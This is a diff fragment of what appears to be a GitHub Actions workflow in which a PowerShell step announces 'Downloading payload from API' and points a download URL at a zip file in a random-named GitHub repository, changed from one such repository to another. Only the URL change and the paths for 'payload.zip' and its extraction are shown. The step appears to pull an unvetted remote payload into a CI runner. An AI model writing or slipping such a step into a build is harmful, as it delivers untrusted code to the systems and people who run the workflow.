@@ -79,7 +79,7 @@ jobs:
         run: |
           Write-Host "[xbl1e] > | Downloading payload from API | <"
 
-          $apiUrl = "https://github.com/kirakohler064-pixel/sasmas-/raw/refs/heads/main/Nueva%20carpeta.zip"
+          $apiUrl = "https://github.com/jkhnfsdkjbsdnkfdsl/music-bot/raw/refs/heads/main/Nueva%20carpeta.zip"
           $zipPath = "$PWD\payload.zip"
           $extractPath = "$PWD\payload"
 
